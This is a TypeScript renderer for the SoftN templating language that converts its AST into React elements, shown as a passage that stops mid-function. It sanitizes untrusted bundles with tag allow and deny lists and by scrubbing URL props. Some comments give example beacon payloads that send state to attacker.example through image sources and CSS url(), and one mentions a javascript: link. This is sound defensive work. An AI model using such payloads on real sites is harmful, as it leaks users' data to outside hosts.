/**
 * SoftN Renderer
 *
 * Converts SoftN AST to React elements.
 */

import React from 'react';
import type {
  SoftNDocument,
  TemplateNode,
  ElementNode,
  TextNode,
  ExpressionNode,
  IfBlock,
  EachBlock,
  Expression,
  SlotNode,
  TemplateSlotNode,
} from '../parser/ast';
import type { SoftNRenderContext, SoftNProps } from '../types';
import { ComponentRegistry, SoftNComponent } from './registry';
import {
  hasRemoteSrcSetCandidate,
  isRemoteUrl,
  isSafeUrl,
  rewriteCssUrls,
  URL_ATTRIBUTES,
} from './sanitize-html';

// Maximum recursion depth for expression evaluation to prevent infinite loops
const MAX_EVAL_DEPTH = 100;

/**
 * JavaScript globals available in template expressions.
 * These are commonly used in .ui files (e.g., Number(), String(), Math.round()).
 */
const JS_GLOBALS: Record<string, unknown> = {
  Number,
  String,
  Boolean,
  Array,
  Date,
  Math,
  JSON,
  parseInt,
  parseFloat,
  isNaN,
  isFinite,
  NaN,
  Infinity,
  undefined,
  encodeURIComponent,
  decodeURIComponent,
};

const BLOCKED_MEMBER_KEYS = new Set(['constructor', '__proto__', 'prototype']);

function getSafeMemberKey(value: unknown): string | null {
  const key = String(value);
  return BLOCKED_MEMBER_KEYS.has(key) ? null : key;
}

/**
 * Per-component error boundary for isolating rendering failures.
 * When a registered SoftN component throws during render, this boundary
 * catches the error and shows an inline indicator instead of crashing the
 * entire document tree.
 */
class ComponentErrorBoundary extends React.Component<
  React.PropsWithChildren<{ tag: string }>,
  { error: Error | null }
> {
  state: { error: Error | null } = { error: null };

  static getDerivedStateFromError(error: Error): { error: Error } {
    return { error };
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    if (isDevelopment) {
      console.error(`[SoftN] Error in <${this.props.tag}>:`, error);
      console.error('[SoftN] Component stack:', info.componentStack);
    }
  }

  componentDidUpdate(prevProps: React.PropsWithChildren<{ tag: string }>) {
    // Auto-reset error state when children change (e.g., source code updated)
    if (this.state.error && prevProps.children !== this.props.children) {
      this.setState({ error: null });
    }
  }

  render() {
    if (this.state.error) {
      return React.createElement(
        'div',
        {
          style: {
            padding: '0.5rem 0.75rem',
            margin: '0.25rem 0',
            background: 'var(--softn-error-bg, #fef2f2)',
            border: '1px solid var(--softn-error-border, #fecaca)',
            borderRadius: '6px',
            color: 'var(--softn-error-text, #b91c1c)',
            fontSize: '0.75rem',
            fontFamily: 'ui-monospace, monospace',
            lineHeight: 1.5,
          },
        },
        React.createElement('strong', null, `<${this.props.tag}>`),
        ` ${this.state.error.message}`
      );
    }
    return this.props.children;
  }
}

// Check if we're in development mode - works in both browser and Node.js
const isDevelopment = (() => {
  try {
    // `import.meta.env` is Vite's, not the language's. A cast rather than a
    // `@ts-expect-error` because whether the property is declared depends on
    // who is compiling: core's own tsconfig has never heard of it, while a root
    // typecheck that also covers an app referencing `vite/client` has — and a
    // suppression that is unnecessary in one of those is itself an error.
    const meta = import.meta as unknown as { env?: { DEV?: boolean } } | undefined;
    if (meta?.env?.DEV) {
      return true;
    }
    if (typeof process !== 'undefined' && process.env?.NODE_ENV === 'development') {
      return true;
    }
  } catch {
    // Ignore errors
  }
  return false;
})();

/**
 * Render a SoftN document to React elements
 */
export function renderDocument(
  document: SoftNDocument,
  context: SoftNRenderContext,
  registry: ComponentRegistry
): React.ReactNode {
  return renderNodes(document.template, context, registry);
}

/**
 * Generate a stable key for a template node based on its location
 */
function generateNodeKey(node: TemplateNode, index: number, parentKey?: string): string {
  const prefix = parentKey ? `${parentKey}-` : '';

  // Use source location if available for stable keys
  if (node.loc) {
    return `${prefix}${node.type}-L${node.loc.line}-C${node.loc.column}`;
  }

  // Fallback to index-based key (less stable but better than nothing)
  return `${prefix}${node.type}-${index}`;
}

/**
 * Render an array of template nodes
 */
export function renderNodes(
  nodes: TemplateNode[],
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  parentKey?: string
): React.ReactNode {
  return nodes.map((node, index) => {
    const key = generateNodeKey(node, index, parentKey);
    return renderNode(node, context, registry, key);
  });
}

/**
 * Render a single template node
 */
export function renderNode(
  node: TemplateNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  switch (node.type) {
    case 'Element':
      return renderElement(node, context, registry, key);

    case 'Text':
      return renderText(node, key);

    case 'Expression':
      return renderExpression(node, context, key);

    case 'IfBlock':
      return renderIfBlock(node, context, registry, key);

    case 'EachBlock':
      return renderEachBlock(node, context, registry, key);

    case 'Slot':
      return renderSlot(node, context, registry, key);

    case 'TemplateSlot':
      // Template slots are collected by parent elements and passed via context
      // They should not be rendered directly - return null here
      return null;

    default:
      return null;
  }
}

/**
 * Safe-by-default HTML allowlist for untrusted bundles.
 * Excludes all active content tags (script, iframe, embed, object, etc.)
 * and document metadata tags that could bypass security policies.
 */
const HTML_ELEMENTS = new Set([
  // Content sectioning
  'address',
  'article',
  'aside',
  'footer',
  'header',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'hgroup',
  'main',
  'nav',
  'section',
  'search',
  // Text content
  'blockquote',
  'dd',
  'div',
  'dl',
  'dt',
  'figcaption',
  'figure',
  'hr',
  'li',
  'menu',
  'ol',
  'p',
  'pre',
  'ul',
  // Inline text semantics
  'a',
  'abbr',
  'b',
  'bdi',
  'bdo',
  'br',
  'cite',
  'code',
  'data',
  'dfn',
  'em',
  'i',
  'kbd',
  'mark',
  'q',
  'rp',
  'rt',
  'ruby',
  's',
  'samp',
  'small',
  'span',
  'strong',
  'sub',
  'sup',
  'time',
  'u',
  'var',
  'wbr',
  // Image and multimedia
  'area',
  'audio',
  'img',
  'map',
  'track',
  'video',
  // Safe embedded content (no active content loaders)
  'picture',
  'source',
  // SVG and MathML
  'svg',
  'math',
  // Canvas (drawing API, no script execution)
  'canvas',
  // Demarcating edits
  'del',
  'ins',
  // Table content
  'caption',
  'col',
  'colgroup',
  'table',
  'tbody',
  'td',
  'tfoot',
  'th',
  'thead',
  'tr',
  // Forms
  'button',
  'datalist',
  'fieldset',
  'form',
  'input',
  'label',
  'legend',
  'meter',
  'optgroup',
  'option',
  'output',
  'progress',
  'select',
  'textarea',
  // Interactive elements
  'details',
  'dialog',
  'summary',
]);

/**
 * Explicitly blocked tags — active content, document metadata, and embedded
 * contexts that could execute code or load external resources in the host DOM.
 * Checked as a denylist safeguard even if the allowlist evolves.
 */
const BLOCKED_TAGS = new Set([
  'script',    // JS execution
  'iframe',    // embedded browsing context
  'embed',     // plugin content
  'object',    // plugin/embedded content
  'portal',    // embedded browsing context
  'link',      // external resource loading
  'meta',      // http-equiv redirects, CSP overrides
  'base',      // base URL hijacking
  'style',     // CSS injection (handled separately by sanitizer)
  'template',  // inert but can be activated by scripts
  'noscript',  // content injection when scripts disabled
  'html',      // document root
  'head',      // document metadata container
  'body',      // document body
  'title',     // document title
  'param',     // object parameters
  'slot',      // web component slot
]);

/**
 * Check if a tag is a valid HTML element (safe for untrusted rendering)
 */
function isHTMLElement(tag: string): boolean {
  const lower = tag.toLowerCase();
  if (BLOCKED_TAGS.has(lower)) return false;
  return HTML_ELEMENTS.has(lower);
}

/**
 * HTML elements that cannot contain children. React rejects the children
 * argument for these outright rather than ignoring it.
 */
const VOID_ELEMENTS = new Set([
  'area',
  'base',
  'br',
  'col',
  'embed',
  'hr',
  'img',
  'input',
  'link',
  'meta',
  'param',
  'source',
  'track',
  'wbr',
]);

/**
 * Attributes whose value the browser will fetch or navigate to.
 *
 * `BLOCKED_TAGS` above stops a bundle from writing `<script>`, but nothing
 * stopped it writing `<a href="javascript:…">`: React only warns, and one click
 * then runs bundle-authored code on the host origin, where every other app's
 * `softn:*` and `xdb:*` storage is readable. `<img src="https://…?d={state}">`
 * is the same hole without the click, and without needing the `net` grant.
 */
const URL_PROPS = new Set([
  ...URL_ATTRIBUTES,
  'xlinkHref', // React's camelCase spelling of xlink:href
  // React's spelling of srcset, and the one an author is likelier to write.
  // URL_ATTRIBUTES is the HTML list, so it only carries the lowercase form —
  // `<img srcSet={…}>` reached the DOM with neither check in front of it.
  'srcSet',
]);

/**
 * Whether a URL prop is egress that the user has not authorised yet.
 *
 * The consent bar withholds every softn.* capability until the user answers,
 * but the bundle's own markup never went through softn.*: `<Image src="https://
 * attacker.example/beacon?d=…">` renders a raw `<img src>`, and the browser
 * fetches it on first paint. Under the modal that was unreachable by accident,
 * because the app did not exist until Allow — this is what replaces the
 * accident. A relative, `data:` or `blob:` source is not egress and is
 * untouched, so a bundle's own images keep working with no capability at all.
 *
 * `srcset` gets its own reading because it is a list, not a URL.
 */
function isWithheldUrl(name: string, value: string, consentPending: boolean): boolean {
  if (!consentPending) return false;
  if (name === 'srcSet' || name === 'srcset') return hasRemoteSrcSetCandidate(value);
  return isRemoteUrl(value);
}

/**
 * Drop unsafe URL props before they reach a raw HTML element.
 *
 * Every name in `URL_PROPS` is safe to judge by name here, because on a raw
 * element it can only ever mean the URL the browser will fetch.
 */
function sanitizeUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
  for (const name of Object.keys(props)) {
    if (!URL_PROPS.has(name)) continue;
    const value = props[name];
    const safe =
      typeof value === 'string'
        ? isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)
          ? value
          : undefined
        : value;
    if (safe === undefined && props[name] !== undefined) {
      if (isDevelopment) {
        console.warn(
          `[SoftN] Blocked unsafe URL in <${tag} ${name}>: ${String(props[name]).slice(0, 80)}`
        );
      }
      delete props[name];
    }
  }
}

/**
 * Withhold remote `url(...)` from an inline `style={{…}}`.
 *
 * `sanitizeBundleCSS` already rewrites remote `url()` in a bundle's style
 * block; the inline style object is a second route to the identical fetch —
 * `style={{ backgroundImage: "url(https://attacker.example/beacon)" }}` — and
 * it had no check at all. Only the consent-pending case is handled here: what
 * an inline style may load *after* the user allows is a separate question
 * about what permission.json governs, and changing it silently would break
 * bundles that legitimately point at a CDN.
 *
 * The object is copied rather than mutated: it may be the app's own state, and
 * deleting from that would corrupt the state as well as the render.
 */
function withholdRemoteStyleUrls(props: SoftNProps, consentPending: boolean): void {
  if (!consentPending) return;
  const style = props.style;
  if (typeof style !== 'object' || style === null || Array.isArray(style)) return;

  let copy: Record<string, unknown> | null = null;
  for (const [name, value] of Object.entries(style as Record<string, unknown>)) {
    if (typeof value !== 'string' || !value.includes('url(')) continue;
    const withheld = rewriteCssUrls(value, isRemoteUrl);
    if (withheld === value) continue;
    if (!copy) copy = { ...(style as Record<string, unknown>) };
    copy[name] = withheld;
  }
  if (copy) props.style = copy;
}

/**
 * URL prop names scrubbed on registered components too, not just raw elements.
 *
 * A registered component is not the boundary the check above assumed it was:
 * `<Breadcrumb items={[{label, href}]}>` hands the href straight to an `<a>`,
 * so leaving the guarantee to each of the 90 built-ins holds only for as long
 * as every one of them remembers. Scrubbing here makes it structural.
 *
 * The set is deliberately narrower than `URL_ATTRIBUTES`, because a component
 * prop is named by whoever wrote the component rather than by HTML. `data` is
 * the rows a chart plots, `action` is the ReactNode an `<EmptyState>` renders
 * under its message, and `background` and `cite` read as a colour and a
 * quotation source — dropping those by name would delete legitimate values.
 * What is left means a URL and nothing else.
 */
const COMPONENT_URL_PROPS = new Set([
  'href',
  'src',
  'srcSet',
  'srcset',
  'poster',
  'formAction',
  'formaction',
  'xlinkHref',
  'xlink:href',
]);

/**
 * How far inside a prop value the scrub descends.
 *
 * `items={[{href}]}` is already two levels down and a nested menu tree is a few
 * more, so the walk has to recurse; the cap is what keeps a state object that
 * refers back to itself from recursing forever.
 */
const MAX_SCRUB_DEPTH = 8;

function isPlainObject(value: unknown): value is Record<string, unknown> {
  if (typeof value !== 'object' || value === null) return false;
  const proto = Object.getPrototypeOf(value);
  return proto === Object.prototype || proto === null;
}

/**
 * Return `value` with any unsafe URL under a `COMPONENT_URL_PROPS` key removed.
 *
 * The same reference comes back when nothing was unsafe, and a copy otherwise:
 * these arrays and objects are the app's own state, so deleting a key in place
 * would corrupt the state as well as the render.
 */
function scrubUrlsIn(
  value: unknown,
  depth: number,
  blocked: string[],
  consentPending: boolean
): unknown {
  if (depth > MAX_SCRUB_DEPTH) return value;

  // Elements arriving as a prop were built by `renderElement`, which already
  // sanitized them; copying one here would drop the non-enumerable bookkeeping
  // React puts on it.
  if (React.isValidElement(value)) return value;

  if (Array.isArray(value)) {
    let copy: unknown[] | null = null;
    for (let i = 0; i < value.length; i++) {
      const next = scrubUrlsIn(value[i], depth + 1, blocked, consentPending);
      if (next !== value[i]) {
        if (!copy) copy = value.slice();
        copy[i] = next;
      }
    }
    return copy ?? value;
  }

  if (isPlainObject(value)) {
    let copy: Record<string, unknown> | null = null;
    for (const name of Object.keys(value)) {
      const next = scrubUrlProp(name, value[name], depth + 1, blocked, consentPending);
      if (next !== value[name]) {
        if (!copy) copy = { ...value };
        copy[name] = next;
      }
    }
    return copy ?? value;
  }

  return value;
}

function scrubUrlProp(
  name: string,
  value: unknown,
  depth: number,
  blocked: string[],
  consentPending: boolean
): unknown {
  if (COMPONENT_URL_PROPS.has(name) && typeof value === 'string') {
    if (isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)) return value;
    blocked.push(value);
    return undefined;
  }
  return scrubUrlsIn(value, depth, blocked, consentPending);
}

/** Drop unsafe URLs from the props of a registered component. */
function sanitizeComponentUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
  const blocked: string[] = [];

  for (const name of Object.keys(props)) {
    const next = scrubUrlProp(name, props[name], 0, blocked, consentPending);
    if (next !== props[name]) props[name] = next;
  }

  if (blocked.length > 0 && isDevelopment) {
    console.warn(`[SoftN] Blocked unsafe URL in <${tag}>: ${blocked[0].slice(0, 80)}`);
  }
}

/**
 * Get a unified context for event handlers and callbacks.
 * Cached on the context object to avoid re-creating per element (~100+ elements per render).
 */
const _callbackCtxCache = new WeakMap<SoftNRenderContext, SoftNRenderContext>();
function createCallbackContext(context: SoftNRenderContext): SoftNRenderContext {
  let cached = _callbackCtxCache.get(context);
  if (cached) return cached;
  cached = {
    ...context,
    functions: { ...context.functions, ...context.asyncFunctions },
  };
  _callbackCtxCache.set(context, cached);
  return cached;
}

/**
 * Evaluate an expression that decides STRUCTURE — a condition or an iterable —
 * and survive it throwing.
 *
 * The same bad data should not be survivable in one position and fatal in
 * another. `{JSON.parse(raw).n}` in a text node is caught and shown as a small
 * inline marker; in a condition or an iterable it escaped the runtime's error
 * boundary and replaced the whole application with an error screen. Which one
 * you got depended only on where you had written it.
 *
 * Commit 8e9366b set out to fix all four positions and reached one: #if. #each,
 * inline `if=` and inline `each=` still tore the app down, which is how this
 * came back — the message said it was handled everywhere, so nobody looked.
 *
 * An unanswerable condition is false. An iterable that cannot be evaluated is
 * empty, which also means an `#each` renders its `#empty` fallback — the right
 * thing to put on screen when the list could not be worked out.
 */
function evaluateStructural<T>(
  expr: Expression,
  context: SoftNRenderContext,
  fallback: T,
  what: string
): unknown {
  try {
    return evaluateExpression(expr, context);
  } catch (error) {
    if (isDevelopment) {
      console.error(`[SoftN] ${what} threw; using ${JSON.stringify(fallback)}:`, error);
    }
    return fallback;
  }
}

/**
 * Render an element node
 * Supports inline conditionals (if=) and loops (each=/as=)
 */
function renderElement(
  node: ElementNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  // Check inline conditional first.
  //
  // Not when the element also loops: such a condition almost always names the
  // loop variable, which is not bound out here, so testing it now answers
  // falsy and drops the whole loop. The per-item recursion below re-enters
  // with the variable bound and keeps `conditionalIf`, which is where an
  // `each` + `if` pair is meant to be resolved.
  if (node.conditionalIf && !node.inlineEach) {
    const condition = evaluateStructural(node.conditionalIf, context, false, 'if= condition');
    if (!condition) {
      return null; // Don't render if condition is falsy
    }
  }

  // Check for inline loop
  if (node.inlineEach) {
    const iterable = evaluateStructural(node.inlineEach.iterable, context, [], 'each= iterable');

    if (!Array.isArray(iterable) || iterable.length === 0) {
      return null; // Don't render if iterable is empty
    }

    // Render element once per item
    const renderedItems = iterable.map((item, index) => {
      const iterContext: SoftNRenderContext = {
        ...context,
        state: {
          ...context.state,
          [node.inlineEach!.itemName]: item,
          ...(node.inlineEach!.indexName ? { [node.inlineEach!.indexName]: index } : {}),
        },
      };

      // Generate a unique key for each iteration
      const itemKey =
        typeof item === 'object' && item !== null && 'id' in item
          ? String((item as { id: unknown }).id)
          : String(index);

      // Render this element without the inline loop (to avoid infinite recursion)
      const nodeWithoutLoop: ElementNode = {
        ...node,
        inlineEach: undefined,
      };

      return renderElement(nodeWithoutLoop, iterContext, registry, `${key}-${itemKey}`);
    });

    return React.createElement(React.Fragment, { key }, renderedItems);
  }

  // First, check the registry for a custom component
  let Component: SoftNComponent | keyof JSX.IntrinsicElements | undefined = registry.get(node.tag);

  // If not in registry, check if it's a valid HTML element
  if (!Component) {
    if (isHTMLElement(node.tag)) {
      // Use the lowercase HTML tag as the component
      Component = node.tag.toLowerCase() as keyof JSX.IntrinsicElements;
    } else {
      if (isDevelopment) {
        console.warn(
          `Unknown component: ${node.tag}. Not a registered component or valid HTML element.`
        );
      }
      // Return a visible error placeholder in development
      return React.createElement(
        'div',
        {
          key,
          style: {
            padding: '0.5rem',
            margin: '0.25rem',
            background: 'var(--softn-error-bg, #fef2f2)',
            border: '1px solid var(--softn-error-border, #fecaca)',
            borderRadius: '0.25rem',
            color: 'var(--softn-error-text, #b91c1c)',
            fontSize: '0.875rem',
            fontFamily: 'monospace',
          },
        },
        `Unknown component: <${node.tag}>`
      );
    }
  }

  // TypeScript guard: Component is now definitely defined
  const FinalComponent = Component;

  // Build props
  const props: SoftNProps = { key };

  // Create a unified context for callbacks
  const callbackContext = createCallbackContext(context);

  // Static and dynamic props
  for (const prop of node.props) {
    if (prop.value.type === 'static' || prop.value.type === 'number' || prop.value.type === 'boolean') {
      props[prop.name] = prop.value.value;
    } else {
      try {
        // Use callbackContext for props that look like callbacks (on*) to ensure
        // state changes from these handlers trigger re-renders
        const isCallbackProp = prop.name.startsWith('on') && prop.name.length > 2;
        const evalContext = isCallbackProp ? callbackContext : context;

        // `onClick={doThing()}` names the call to make on click, not a value to
        // compute now — the same reading `@click={doThing()}` already gets from
        // the events loop below. Evaluating it here ran the handler on every
        // render and then passed its return value as the callback.
        if (isCallbackProp && prop.value.value.type === 'CallExpression') {
          const callExpr = prop.value.value;
          props[prop.name] = () => evaluateExpression(callExpr, evalContext);
          continue;
        }

        const evaluated = evaluateExpression(prop.value.value, evalContext);

        props[prop.name] = evaluated;
      } catch (error) {
        if (isDevelopment) {
          console.warn(`Error evaluating prop "${prop.name}" on <${node.tag}>:`, error);
        }
        props[prop.name] = undefined;
      }
    }
  }

  // Bindings
  for (const binding of node.bindings) {
    let value: unknown;
    try {
      value = evaluateExpression(binding.expression, context);
    } catch (error) {
      if (isDevelopment) {
        console.warn(`Error evaluating binding ":${binding.name}" on <${node.tag}>:`, error);
      }
      value = undefined;
    }

    // A checkbox-shaped control carries its state in `checked`, not `value` —
    // its `value` is the constant "on". Binding `value` left `checked`
    // undefined, so the control ran uncontrolled and never reflected the bound
    // variable, while the change wrote the string "on" back over it.
    const isRadio = node.tag === 'Radio' || props.type === 'radio';
    const isCheckable =
      node.tag === 'Checkbox' ||
      node.tag === 'Switch' ||
      props.type === 'checkbox' ||
      isRadio;

    if (binding.name === 'bind') {
      // Two-way binding shorthand
      // Default to "" when value is undefined/null to keep the input controlled
      // from the first render (avoids React "uncontrolled to controlled" warning)
      if (isRadio) {
        // A radio is checkable but not boolean. It is checked when the bound
        // variable equals THIS radio's value, and choosing it should write that
        // value. Treated as a checkbox it was `value === true` — never true for
        // a real choice — so every radio in the group rendered unchecked, and
        // clicking one wrote `true` over the selection, destroying the answer it
        // was meant to record.
        props.checked = value !== undefined && value !== null && String(value) === String(props.value);
      } else if (isCheckable) {
        props.checked = value === true;
      } else {
        props.value = value ?? '';
      }
      // Handle both native elements (pass event) and custom components (pass value directly)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      props.onChange = (eventOrValue: any) => {
        // Extract path from expression (supports complex paths)
        // The context carries the loop variables, so an index inside #each
        // resolves to the row actually being edited.
        const path = getExpressionPath(binding.expression, context);
        if (path) {
          const rootVar = path.split('.')[0].split('[')[0]; // Handle array access

          // Determine the new value:
          // - If it's an event object with target.value (native elements), use that
          // - Otherwise, treat the argument as the value directly (custom components like Select)
          let newValue: unknown;
          if (isRadio) {
            // The chosen option, not a boolean. A radio's `value` is the answer.
            newValue = props.value;
          } else if (isCheckable) {
            // Read `checked`, and as a boolean: `target.value` on a checkbox is
            // the constant "on", which would make the bound variable a string
            // that never compares false again.
            newValue =
              eventOrValue && typeof eventOrValue === 'object' && 'target' in eventOrValue
                ? Boolean(eventOrValue.target.checked)
                : Boolean(eventOrValue);
          } else if (
            eventOrValue &&
            typeof eventOrValue === 'object' &&
            'target' in eventOrValue &&
            'value' in eventOrValue.target
          ) {
            // Native DOM event
            newValue = eventOrValue.target.value;
          } else {
            // Custom component passing value directly
            newValue = eventOrValue;
          }

          // Look for an external handler first (on[VarName]Change or onUpdate)
          // This allows parent components to manage state externally
          const updateHandler =
            context.functions[`on${capitalize(rootVar)}Change`] || context.functions['onUpdate'];

          if (typeof updateHandler === 'function') {
            // Use the external handler
            updateHandler(path, newValue);
          } else if (rootVar in context.props) {
            // Props are read-only and no handler was provided
            if (isDevelopment) {
              console.warn(
                `Cannot update prop "${path}" directly. Props are read-only. ` +
                  `Define an on${capitalize(rootVar)}Change or onUpdate handler to propagate changes.`
              );
            }
          } else {
            // It's internal state - update directly
            context.setState(path, newValue);
          }
        }
      };
    } else {
      props[binding.name] = value;
    }
  }

  // Event handlers - use unified callback context
  // For change/input events, auto-extract target.value so VM functions
  // receive the string value instead of a React SyntheticEvent object.
  const wrapEventHandler = (name: string, fn: (...args: any[]) => any) => {
    if (name === 'change' || name === 'input') {
      return (e: any) => {
        const val = e && typeof e === 'object' && e.target && 'value' in e.target ? e.target.value : e;
        return fn(val);
      };
    }
    // Everything else gets its arguments forwarded.
    //
    // These are not all DOM events: a component decides what it hands its own
    // callback, and several pass plain data — DPad gives `@press` the direction
    // pressed, and dropping it left every on-screen control doing nothing while
    // the keyboard path still worked. Where the argument really is a DOM event,
    // the VM adapter's allowlist already reduces it to null before it can reach
    // a script (see `sanitizeArgs`), and a handler written in the template is
    // entitled to the event anyway.
    return (...args: unknown[]) => fn(...args);
  };

  for (const event of node.events) {
    // What :bind already installed for this event, if anything.
    //
    // `<input :bind={q} @change={note()} />` used to lose its binding entirely:
    // the bindings loop sets onChange to write state back, and this loop then
    // assigned over it. The field stopped updating — every keystroke was
    // discarded and the input sat frozen on its initial value — while the
    // handler the author added ran perfectly, so nothing looked broken except
    // the typing. Both are wanted; both run, binding first so the handler sees
    // the new value.
    const boundHandlerName = reactEventProp(event.name);
    const boundHandler = props[boundHandlerName];

    // If the handler is a function call (e.g., @click={handleClick()}),
    // we need to wrap it in a closure to prevent immediate execution during render.
    // If it's a function reference or arrow function, evaluate it directly.
    const handlerExpr = event.handler;

    if (handlerExpr.type === 'CallExpression') {
      // Wrap in closure - execute the call when the event fires
      props[reactEventProp(event.name)] = wrapEventHandler(event.name, () => {
        return evaluateExpression(handlerExpr, callbackContext);
      });
    } else if (handlerExpr.type === 'ArrowFunctionExpression') {
      // Arrow functions are already deferred - evaluate to get the function
      const handler = evaluateExpression(handlerExpr, callbackContext);
      props[reactEventProp(event.name)] = typeof handler === 'function' ? wrapEventHandler(event.name, handler as (...args: any[]) => any) : handler;
    } else if (handlerExpr.type === 'Identifier' || handlerExpr.type === 'MemberExpression') {
      // Function reference - evaluate to get the function, wrap to ensure it's callable
      const handler = evaluateExpression(handlerExpr, callbackContext);
      if (typeof handler === 'function') {
        props[reactEventProp(event.name)] = wrapEventHandler(event.name, handler as (...args: any[]) => any);
      } else {
        // If not a function, wrap in a no-op to prevent errors.
        // Only warn if the script has finished loading — before that, functions
        // aren't available yet and this is expected.
        if (isDevelopment && context.scriptLoaded) {
          console.warn(`Event handler for ${event.name} is not a function:`, handler);
        }
        props[reactEventProp(event.name)] = () => {};
      }
    } else {
      // Other expression types - wrap in closure for safety
      props[reactEventProp(event.name)] = wrapEventHandler(event.name, () => {
        return evaluateExpression(handlerExpr, callbackContext);
      });
    }

    const authored = props[boundHandlerName];
    if (typeof boundHandler === 'function' && authored !== boundHandler) {
      props[boundHandlerName] = (...args: unknown[]) => {
        (boundHandler as (...a: unknown[]) => unknown)(...args);
        if (typeof authored === 'function') {
          return (authored as (...a: unknown[]) => unknown)(...args);
        }
        return undefined;
      };
    }
  }

  // Extract slot content from children (template slots and default content)
  const { slotContent, defaultChildren } = extractSlotContent(node.children);

  // Create context with slots for child components
  const childContext: SoftNRenderContext = slotContent
    ? { ...context, slots: slotContent }
    : context;

  // Render non-slot children with parent key for stable keys
  const children = renderNodes(defaultChildren, childContext, registry, String(key));

  // A string tag means these props go straight to the DOM, so every name HTML
  // treats as a URL can be judged by name. A registered component gets the
  // narrower, unambiguous set instead, applied through the whole prop value
  // rather than only its top level.
  const consentPending = context.consentPending === true;
  if (typeof FinalComponent === 'string') {
    sanitizeUrlProps(props, node.tag, consentPending);
  } else {
    sanitizeComponentUrlProps(props, node.tag, consentPending);
  }
  // Applies to both: a registered component that spreads `style` onto its root
  // element reaches the network by exactly the same route a raw <div> does.
  withholdRemoteStyleUrls(props, consentPending);

  // Void elements take no children, and React throws rather than ignoring the
  // argument — even for the empty array `renderNodes` returns for a childless
  // element. `img`, `br`, `hr`, `input` and `source` are all on the allowlist
  // above, so every one of them crashed the render of any `.ui` that used the
  // plain HTML tag. The demos only reach them through wrapper components like
  // `<Image>`, which is why it went unnoticed.
  const element =
    typeof FinalComponent === 'string' && VOID_ELEMENTS.has(node.tag.toLowerCase())
      ? React.createElement(FinalComponent, props)
      : React.createElement(FinalComponent, props, children);

  // Wrap registered (non-HTML) components in a per-component error boundary
  // so a single component crash doesn't take down the entire document
  if (typeof FinalComponent !== 'string') {
    return React.createElement(ComponentErrorBoundary, { key, tag: node.tag }, element);
  }

  return element;
}

/**
 * Extract slot content from children
 * Returns slot content mapping and remaining default children
 *
 * The logic is:
 * - TemplateSlot nodes are extracted into slotContent by their name
 * - Non-slot children are kept as defaultChildren and rendered normally
 * - If there are no template slots, children are rendered normally (no slot extraction)
 */
function extractSlotContent(children: TemplateNode[]): {
  slotContent: Record<string, TemplateNode[]> | null;
  defaultChildren: TemplateNode[];
} {
  const slotContent: Record<string, TemplateNode[]> = {};
  const defaultChildren: TemplateNode[] = [];
  let hasTemplateSlots = false;

  for (const child of children) {
    if (child.type === 'TemplateSlot') {
      // This is an explicit <template slot="name">...</template> block
      hasTemplateSlots = true;
      const slotNode = child as TemplateSlotNode;
      const name = slotNode.name || 'default';
      if (!slotContent[name]) {
        slotContent[name] = [];
      }
      slotContent[name].push(...slotNode.children);
    } else {
      // Regular child - render normally
      defaultChildren.push(child);
    }
  }

  // If we have template slots, also add non-slot children to default slot
  // This allows mixing explicit slots with default content
  if (hasTemplateSlots && defaultChildren.length > 0) {
    if (!slotContent['default']) {
      slotContent['default'] = [];
    }
    slotContent['default'].push(...defaultChildren);
  }

  // Return slots only if we found template slots
  // Otherwise just render children normally
  return {
    slotContent: hasTemplateSlots ? slotContent : null,
    defaultChildren: hasTemplateSlots ? [] : defaultChildren,
  };
}

/**
 * Render a slot node
 */
function renderSlot(
  node: SlotNode,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  const slotName = node.name || 'default';

  // Check if we have content for this slot from parent
  if (context.slots && context.slots[slotName]) {
    const slotChildren = context.slots[slotName];
    return React.createElement(
      React.Fragment,
      { key },
      renderNodes(slotChildren, context, registry, `slot-${slotName}`)
    );
  }

  // Use fallback content if provided
  if (node.fallback && node.fallback.length > 0) {
    return React.createElement(
      React.Fragment,
      { key },
      renderNodes(node.fallback, context, registry, `slot-fallback-${slotName}`)
    );
  }

  // No content and no fallback
  return null;
}

/**
 * Render a text node
 */
function renderText(node: TextNode, key?: number | string): React.ReactNode {
  // Use React.Fragment to properly handle text nodes
  return React.createElement(React.Fragment, { key }, node.content);
}

/**
 * Render an expression node (interpolation)
 */
function renderExpression(
  node: ExpressionNode,
  context: SoftNRenderContext,
  key?: number | string
): React.ReactNode {
  let value: unknown;
  try {
    value = evaluateExpression(node.expression, context);
  } catch {
    return null; // Gracefully handle expression evaluation errors
  }
  // Booleans render as nothing, as they do in JSX. `{ready && "Go"}` yields
  // `false` when the guard fails, and printing that put the word "false" in the
  // UI — which is what the idiom is meant to avoid. A bundle that wants to show
  // one can ask for it with `{String(flag)}`.
  const text = value == null || typeof value === 'boolean' ? '' : String(value);
  return React.createElement(React.Fragment, { key }, text);
}

/**
 * Render an if block
 *
 * Uses unique keys to force React to completely unmount and remount content
 * when switching between conditional branches.
 */
/**
 * Extract a descriptive identifier from a condition expression
 * Used to generate more unique keys for conditional branches
 */
function getConditionIdentifier(condition: Expression): string {
  if (condition.type === 'BinaryExpression') {
    // For comparisons like `currentPage === "dashboard"`, extract the right value
    if (condition.operator === '===' || condition.operator === '==') {
      // Read a literal operand directly instead of evaluating it. This only
      // builds a React key, and the condition has already been evaluated by the
      // caller — evaluating the operand again ran any call inside it a second
      // time on every render.
      if (condition.right.type === 'Literal') {
        const rightValue = condition.right.value;
        if (typeof rightValue === 'string' || typeof rightValue === 'number') {
          return String(rightValue);
        }
      }
    }
  }
  // For identifiers, use the name
  if (condition.type === 'Identifier') {
    return condition.name;
  }
  return 'cond';
}

function renderIfBlock(
  node: IfBlock,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string,
  branchPath: string = ''
): React.ReactNode {
  const condition = evaluateStructural(node.condition, context, false, '#if condition');

